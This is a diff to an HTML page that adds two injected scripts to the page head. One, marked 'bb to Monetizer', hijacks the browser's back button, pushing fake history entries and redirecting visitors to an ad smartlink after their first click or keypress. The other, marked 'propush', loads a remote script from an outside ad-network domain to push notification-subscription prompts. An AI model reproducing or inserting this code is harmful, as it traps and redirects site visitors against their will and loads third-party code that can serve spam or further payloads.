@@ -259,6 +259,35 @@ ansform: rotate(-45deg);
     }
 }
 </style>
+
+
+<!--bb to Monetizer-->
+
+<script> function imiBB() { let url = "https://app.impih.com/?utm_medium=43f99f70b126f87db2fc1abfd2a6ee8b6d6ec8fc&utm_campaign=ng_smartlink&np=1"; try { history.pushState({}, '', location.href); history.pushState({}, '', location.href); window.onpopstate = function (ev) { if (ev['state']) { location.replace(url); } }; } catch (ex) {} } !function () { let touched = false; let chromeVersion = 0; try { chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]); } catch (e) { chromeVersion = 0; } if (chromeVersion >= 75) { window.addEventListener('mouseup', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.addEventListener("DOMContentLoaded", function () { document.body.addEventListener('touchend', function (evt) { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.body.addEventListener('keydown', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); } ); } else { setTimeout(function () { imiBB(); } , 0); } } (); </script>
+  
+
+
+  
+  
+            
+    <!--propush-->
+<script>
+    var s = document.createElement('script');
+    s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5168327'+'&sw=/sw-check-permissions-ea2cf.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
+
+
+
 </head>
 <body>
 <div class="wrapper" style="text-align: center;">
